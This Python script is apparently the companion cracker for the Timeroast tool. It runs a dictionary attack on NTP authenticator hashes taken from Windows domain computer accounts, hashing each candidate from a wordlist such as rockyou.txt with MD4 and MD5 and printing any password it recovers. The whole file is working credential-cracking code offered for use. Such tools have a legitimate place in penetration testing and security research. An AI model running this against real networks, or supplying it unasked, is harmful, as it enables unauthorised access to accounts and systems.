#!/usr/bin/env python3
"""
Perform a simple dictionary attack against the output of timeroast.py.

Necessary because the NTP 'hash' format unfortunately does not fit into Hashcat or John right now.

Not even remotely optimized, but still useful for cracking legacy default passwords (where the password is the computer
name) or specific default passwords that are popular in an organisation.
"""

import hashlib
import sys
import re
from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Generator, Tuple

HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'


def md4(data: bytes) -> bytes:
    try:
        return hashlib.new('md4', data).digest()
    except ValueError:
        # Fallback to pure Python MD4 if OpenSSL lacks support
        from md4 import MD4
        return MD4(data).bytes()


def compute_hash(password: str, salt: bytes) -> bytes:
    """
    Compute a legacy NTP authenticator 'hash'.
    """
    return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()


def try_crack(hashfile: TextIO, dictfile: TextIO) -> Generator[Tuple[int, str], None, None]:
    hashes = []
    for line in hashfile:
        line = line.strip()
        if line:
            m = re.match(HASH_FORMAT, line)
            if not m:
                print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
                sys.exit(1)
            rid, hashval, salt = m.group('rid', 'hashval', 'salt')
            hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))

    for password in dictfile:
        password = password.strip()
        for rid, hashval, salt in hashes:
            if compute_hash(password, salt) == hashval:
                yield rid, password


def main():
    argparser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        description="""\
Perform a simple dictionary attack against the output of timeroast.py.
Not even remotely optimized, but still useful for cracking legacy default
passwords (where the password is the computer name) or specific default
passwords that are popular in an organisation.
"""
    )
    argparser.add_argument(
        'hashes',
        type=FileType('r'),
        help='Output of timeroast.py'
    )
    argparser.add_argument(
        'dictionary',
        type=lambda f: open(f, encoding='latin-1'),
        help='Line-delimited password dictionary (e.g. rockyou.txt)'
    )

    args = argparser.parse_args()
    crackcount = 0

    for rid, password in try_crack(args.hashes, args.dictionary):
        print(f'[+] Cracked RID {rid} password: {password}')
        crackcount += 1

    print(f'\n{crackcount} passwords recovered.\n')


if __name__ == '__main__':
    main()
